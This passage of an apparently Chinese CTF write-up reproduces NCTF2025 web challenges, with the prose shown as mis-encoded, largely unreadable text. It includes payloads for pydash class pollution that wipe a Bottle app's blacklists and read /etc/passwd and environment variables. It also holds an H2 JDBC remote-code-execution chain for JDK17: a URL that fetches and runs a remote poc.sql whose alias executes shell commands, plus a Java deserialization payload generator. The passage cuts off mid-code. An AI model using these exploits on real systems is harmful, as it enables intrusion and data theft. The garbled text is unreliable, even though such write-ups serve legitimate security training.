class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__subclasshook__&#x27;</span>, <span class="hljs-string">&#x27;__wrapped__&#x27;</span>,<br>               <span class="hljs-string">&quot;Optional&quot;</span>,<span class="hljs-string">&quot;render&quot;</span><br>               ]<br>__forbidden_name__=[<br>    <span class="hljs-string">&quot;bottle&quot;</span><br>]<br>__forbidden_name__.extend(<span class="hljs-built_in">dir</span>(<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&quot;__builtins__&quot;</span>]))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setval</span>(<span class="hljs-params">name:<span class="hljs-built_in">str</span>, path:<span class="hljs-built_in">str</span>, value:<span class="hljs-built_in">str</span></span>)-&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>]:<br>    <span class="hljs-keyword">if</span> name.find(<span class="hljs-string">&quot;__&quot;</span>)&gt;=<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> __forbidden_name__:<br>        <span class="hljs-keyword">if</span> name==word:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> __forbidden_path__:<br>        <span class="hljs-keyword">if</span> path.find(word)&gt;=<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    obj=<span class="hljs-built_in">globals</span>()[name]<br>    <span class="hljs-keyword">try</span>:<br>        <br>        pydash.set_(obj,path,value) <span class="hljs-comment"># æ¼æ´ç‚¹ï¼Œobjä¸ºpydashï¼Œ</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># print(dir(pydash))</span><br><br><span class="hljs-meta">@bottle.post(<span class="hljs-params"><span class="hljs-string">&#x27;/setValue&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_value</span>():<br>    name = bottle.request.query.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    path=bottle.request.json.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(path,<span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name)&gt;<span class="hljs-number">6</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(path)&gt;<span class="hljs-number">32</span>: <span class="hljs-comment"># nameçš„é•¿åº¦å°äºç­‰äº6</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no&quot;</span><br>    value=bottle.request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-keyword">if</span> setval(name, path, value) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;no&quot;</span><br><br><span class="hljs-meta">@bottle.get(<span class="hljs-params"><span class="hljs-string">&#x27;/render&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>():<br>    path=bottle.request.query.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path)&gt;<span class="hljs-number">10</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker&quot;</span><br>    blacklist=[<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>] <br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker&quot;</span><br>    <span class="hljs-keyword">return</span> bottle.template(path)<br>bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹çš„æƒ³æ³•å°±æ˜¯ï¼Œå› ä¸ºnameè¢«é™åˆ¶ä¸ºäº†6ä½ï¼Œè¦ä¸å°±ä»pydashï¼Œè¦ä¸å°±ä»setvalè¿™ä¸¤ä¸ªåœ°æ–¹å…¥æ‰‹ï¼Œç„¶ä¹pathçš„globalså’Œbuiltinsæ˜¯æ²¡æœ‰è¢«bançš„ï¼Œç„¶åæƒ³é€šè¿‡æ±¡æŸ“æ‹¿åˆ°bottleï¼Œç„¶åå»æ±¡æŸ“æ¸²æŸ“çš„æ¨¡æ¿ï¼Œä½†æ˜¯æ‰¾äº†åŠå¤©è¿˜æ˜¯æ‰¾ä¸åˆ°ç»•è¿‡çš„æ–¹æ³•ï¼Œç›´æ¥globalsæ ¹æœ¬æ‹¿ä¸åˆ°bottle</p><p>åæ¥çœ‹åˆ°åˆ«äººçš„æ€è·¯æ˜¯å…ˆæ±¡æŸ“pydashå›æœ‰æ¼æ´çš„ä»£ç ï¼Œæ­¤äº‹åœ¨sanicä¹Ÿæœ‰è®°è½½ï¼Œå°±æ˜¯åˆ©ç”¨ä»–çš„5.1.2ç‰ˆæœ¬çš„pathè§£ææ¼æ´æ¥ç»•è¿‡</p><p><img src="https://cdn.clown2024.cn/image-20250324094415736.png" alt="image-20250324094415736"></p><p><del>ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦æ±¡æŸ“RE_PATH_KEY_DELIMè¿™ä¸ªæ­£åˆ™æ¨¡å¼å›5.1.2çš„æ¨¡å¼ï¼Œç„¶åæ¥ç»•è¿‡é»‘åå•çš„è¿‡æ»¤</del></p><p>emmmå»çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰æ¼æ´çš„ç‰ˆæœ¬çš„æ­£åˆ™å’Œæ–°çš„æ­£åˆ™æ²¡åŒºåˆ«å•Š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 5.1.2çš„æ­£åˆ™<br>(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])<br># æ–°çš„æ­£åˆ™<br>(?&lt;!\\)(?:\\\\)*\.|(\[-?\d+\])<br></code></pre></td></tr></table></figure><p>æ–°ç‰ˆçš„ä»£ç è§£æé€»è¾‘</p><p><img src="https://cdn.clown2024.cn/image-20250324100700677.png" alt="image-20250324100700677"></p><p>ç„¶åæˆ‘æŠŠæ­£åˆ™æ‹‰å‡ºæ¥æµ‹è¯•äº†ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br>RE_PATH_KEY_DELIM = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[-?\d+\])&quot;</span>)<br><br><br>value=<span class="hljs-string">&quot;__init__.__globals__&quot;</span><br>value1 = <span class="hljs-string">&quot;__init__\\\\.__globals__&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value1))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value1))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324115755280.png" alt="image-20250324115755280"></p><p>è¿™å’Œsanicä¸­çš„é‚£ä¸ªç»•è¿‡æ²¡æœ‰ä»»ä½•æ”¹å˜å•Š</p><p>åæ¥æˆ‘å¹²è„†ç›´æ¥å»è¯•äº†ä¸€ä¸‹åˆ°åº•ç›´æ¥æ”¹æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œç»ˆäºç»™æˆ‘å‘ç°ç«¯å€ªäº†(åŸæ¥ä»–ä»¬æŒ‡çš„æ¼æ´æ˜¯è¿™ä¸ªå•ŠğŸ¥²)</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br>RE_PATH_KEY_DELIM = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[-?\d+\])&quot;</span>)<br><br>__forbidden_path__ = <span class="hljs-string">&quot;123&quot;</span><br>value=<span class="hljs-string">&quot;__globals__.__forbidden_path__&quot;</span><br>value1 = <span class="hljs-string">&quot;__init__\\\\.__globals__&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value1))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value1))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setval</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>instance = b()<br><span class="hljs-comment"># print(dir(instance.__init__.__class__.__globals__))</span><br>pydash.set_(setval,value,<span class="hljs-string">&quot;aaa&quot;</span>)<br><span class="hljs-built_in">print</span>(__forbidden_path__)<br></code></pre></td></tr></table></figure><p>åœ¨æˆ‘æµ‹è¯•èƒ½å¦ç›´æ¥ä¿®æ”¹forbidden_pathçš„æ—¶å€™ï¼Œä»–ç»™æˆ‘æŠ¥äº†ä¸€ä¸ªé”™è¯¯</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324144251613.png" alt="image-20250324144251613"></p><p>ç„¶åå»ç¿»æºç </p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324144325047.png" alt="image-20250324144325047"></p><p>é‚£ä¹ˆæˆ‘åªè¦æŠŠè¿™é‡Œç»™æ±¡æŸ“äº†ä¸å°±å¯ä»¥äº†æˆåŠŸä¿®æ”¹æ‰€æœ‰é»‘åå•äº†å—ï¼Œæˆ‘å…ˆæ¢ä¸€ä¸‹5.1.2çš„pydashçœ‹æ˜¯ä¸æ˜¯æ²¡æœ‰åšè¿™ä¸ªé™åˆ¶</p><p><img src="https://cdn.clown2024.cn/image-20250324144505707.png" alt="image-20250324144505707"></p><p>æœç„¶ï¼Œä»¥å‰æ˜¯æ²¡æœ‰åšé™åˆ¶çš„ï¼Œç»ˆäºæ‰¾åˆ°é—®é¢˜æ‰€åœ¨äº†ï¼Œç›®æ ‡æ˜ç¡®äº†è¿™ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(pydash.helpers.RESTRICTED_KEYS)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥æ‹¿åˆ°é»‘åå•</p><p>ç„¶åæ±¡æŸ“pydash</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324145004433.png" alt="image-20250324145004433"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>é‚£ç°åœ¨å°±å¯ä»¥å»ä»setvalå°†é»‘åå•å…¨éƒ¨è¦†ç›–äº†</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324145205642.png" alt="image-20250324145205642"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;__globals__.__forbidden_name__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324145218751.png" alt="image-20250324145218751"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;__globals__.__forbidden_path__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å…¨éƒ¨æ±¡æŸ“æˆåŠŸï¼Œç°åœ¨ä¹Ÿå¯ä»¥ç›´æ¥å»æ‹¿bottleäº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦æ±¡æŸ“bottleçš„ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Œæ¥ä¸‹æ¥å»çœ‹ä¸€ä¸‹ä»–çš„templateå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/image-20250324150136967.png" alt="image-20250324150136967"></p><p>æœ‰ä¸€ä¸ªTEMPLATE_PATH</p><p><img src="https://cdn.clown2024.cn/image-20250324150451450.png" alt="image-20250324150451450"></p><p>ä»–çš„ä½œç”¨åº”è¯¥æ˜¯ç”¨æ¥è§„å®šæ¨¡æ¿çš„æœç´¢è·¯å¾„ï¼Œè¡¨ç¤ºæ¡†æ¶ä¼šä¾æ¬¡åœ¨ <strong>å½“å‰ç›®å½•</strong> å’Œ <strong><code>views/</code>å­ç›®å½•</strong> ä¸‹æŸ¥æ‰¾æ¨¡æ¿æ–‡ä»¶</p><p>é‚£æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ä»–çš„æœç´¢è·¯å¾„ä¸º&#x2F;proc&#x2F;selfå³å¯ï¼Œç„¶åpathä¼ å‚çš„æ—¶å€™åŠ ä¸Šenvironå°±å¯ä»¥è·å¾—ç¯å¢ƒå˜é‡äº†</p><p>è¿™é‡Œæ³¨æ„ä¸€å®šè¦æ˜¯åˆ—è¡¨çš„å½¢å¼</p><p>å…ˆè¯»ä¸€ä¸‹&#x2F;etc&#x2F;passwdè¯•è¯•</p><p><img src="https://cdn.clown2024.cn/image-20250324151251417.png" alt="image-20250324151251417"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TEMPLATE_PATH&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/etc&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324151304046.png" alt="image-20250324151304046"></p><p>å¥½çš„æˆåŠŸï¼Œé‚£æ¥ä¸‹æ¥å»è¯»environå°±å¯ä»¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20250324151409375.png" alt="image-20250324151409375"></p><p><img src="https://cdn.clown2024.cn/image-20250324151403402.png" alt="image-20250324151403402"></p><h1 id="h2_revenge"><a href="#H2-revenge" class="headerlink" title="H2_revenge"></a>H2_revenge</h1><p>jdk17çš„h2çš„rce</p><p>ç½‘ä¸Šå¾ˆå¤§ä¸€éƒ¨åˆ†éƒ½æ˜¯h2çš„1.xçš„ç‰ˆæœ¬ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰å½±å“ï¼Œè¿™ä¸ªh2æ˜¯2.xçš„ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20250324152650526.png" alt="image-20250324152650526"></p><p>å°±ä¸¤ä¸ªä¾èµ–ï¼Œä¸€ä¸ªh2ï¼Œä¸€ä¸ªspringboot-webï¼Œé»˜è®¤å…¶é™„å¸¦jackson</p><p><img src="https://cdn.clown2024.cn/image-20250324154502086.png" alt="image-20250324154502086"></p><p>controllerä¹Ÿéå¸¸ç®€å•ï¼Œå°±æ˜¯base64è§£ç ä¹‹åååºåˆ—åŒ–</p><p>ç„¶åè¿˜æœ‰ä¸€ä¸ªé¢˜ç›®è‡ªå·±å†™çš„MyDataSource</p><p><img src="https://cdn.clown2024.cn/image-20250324154621499.png" alt="image-20250324154621499"></p><p>æˆ‘è§‰å¾—è¿™ä¸ªè‚¯å®šæ˜¯éœ€è¦ç”¨åˆ°çš„</p><p>ä½†æ˜¯h2æˆ‘ä¸æ˜¯å¾ˆç†Ÿï¼Œæ²¡æœ‰è°ƒè¯•è¿‡</p><p>é¦–å…ˆè¿™é‡Œæ˜¯é»˜è®¤äº†æœ‰jacksonä¾èµ–å¯ä»¥æ‰“jacksonååºåˆ—åŒ–çš„ï¼Œä½†æ˜¯æœ€ç»ˆæ‰§è¡Œç‚¹çš„TemplatesImplåœ¨JDK17ä¸‹é¢æ˜¯æ²¡æœ‰çš„äº†ï¼Œéœ€è¦æ›¿æ¢ï¼Œç„¶åæœç´¢åˆ°è¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></p><p>è¿™å°±æ˜¯åœ¨é«˜ç‰ˆæœ¬ä¸‹ç”¨æ¥æ›¿æ¢TemplatesImplçš„ä¸€ç§æ–¹æ³•</p><p>h2çš„æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">H2JDBC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url);<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>            ex.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>poc.sqlçš„ä»£ç </p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS SHELLEXEC <span class="hljs-keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;<br>        java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);<br>        <span class="hljs-keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;<br>$$;<br><span class="hljs-keyword">CALL</span> SHELLEXEC(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324171319485.png" alt="image-20250324171319485"></p><p>ç„¶åæ‰“ç®—ç”¨BadAttributeValueExpExceptionæ¥è§¦å‘toStringï¼Œä½†æ˜¯è¿™é‡Œjdk17éœ€è¦ç»•è¿‡moduleæ¥åå°„ä¿®æ”¹å˜é‡ï¼Œæˆ‘å°è¯•ä¹‹åä»–è¿˜æ˜¯è¿›è¡Œäº†æŠ¥é”™</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// å°†TemplatesImplæ”¹æˆMyDataSource</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://192.168.121.164:8008/poc.sql&#x27;&quot;</span>;<br>        <span class="hljs-type">MyDataSource</span> <span class="hljs-variable">myDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(url,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(myDataSource);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// è¿™é‡Œè¦æ”¹æˆé«˜ç‰ˆæœ¬åå°„èµ‹å€¼valæ‰è¡Œï¼Œä¸èƒ½ç›´æ¥æ„é€ å‡½æ•°æ¥è®¾ç½®ï¼Œå› ä¸ºæ„é€ å‡½æ•°æ˜¯ä½¿ç”¨çš„val.toString()æ¥è®¾ç½®çš„</span><br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//è·å–Unsafeå®ä¾‹</span><br>        <span class="hljs-comment">//è·å–ClassLoaderçš„module</span><br>        Module baseModule=Object.class.getModule();<br>        <span class="hljs-comment">//æ›´æ”¹å½“å‰è¿è¡Œç±»çš„Module</span><br>        Class&lt;?&gt; currentClass= exp.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule);<br>        <span class="hljs-comment">//ç°åœ¨å°±èƒ½æ­£å¸¸åå°„äº†</span><br><span class="hljs-comment">//        Field valField = ClassLoader.class.getDeclaredField(&quot;val&quot;);</span><br><span class="hljs-comment">//        valField.setAccessible(true);</span><br><span class="hljs-comment">//        valField.set(val, jsonNodes);</span><br>        setValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br>        <span class="hljs-comment">// æ‰“å°base64çš„payload</span><br>        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));<br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="hljs-comment">//        Object o = (Object)ois.readObject();</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324201141317.png" alt="image-20250324201141317"></p><p>æ²¡ç†è§£ï¼Œæ‰¾äº†ä¸€ä¸‹æ–‡ç« ï¼š<a href="https://forum.butian.net/share/3748%EF%BC%8C%E8%BF%99%E7%AF%87%E7%9A%84%E5%86%99%E6%B3%95%E4%B9%9F%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E4%B8%8D%E8%A1%8C">https://forum.butian.net/share/3748ï¼Œè¿™ç¯‡çš„å†™æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šä¸è¡Œ</a></p><p>åæ¥è¿›å»æºç çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°valè¢«å›ºå®šä¸ºStringäº†</p><p><img src="https://cdn.clown2024.cn/image-20250324203801431.png" alt="image-20250324203801431"></p><p>jdk8çš„æ—¶å€™æ˜¯Objectï¼Œæ‰€ä»¥ä¸è¡Œ</p><p>é‚£åªèƒ½æ¢ä¸€ä¸ªè§¦å‘toStringçš„é“¾å­äº†</p><p>è¿™é‡Œæ‰¾åˆ°EventListenerè¿™ä¸ªé“¾å­ï¼Œæ–‡ç« ï¼š<a href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html">http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html</a></p><p>æ¢æˆEventListenerå°±å¯ä»¥äº†</p><p>æœ¬åœ°èƒ½æˆçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td 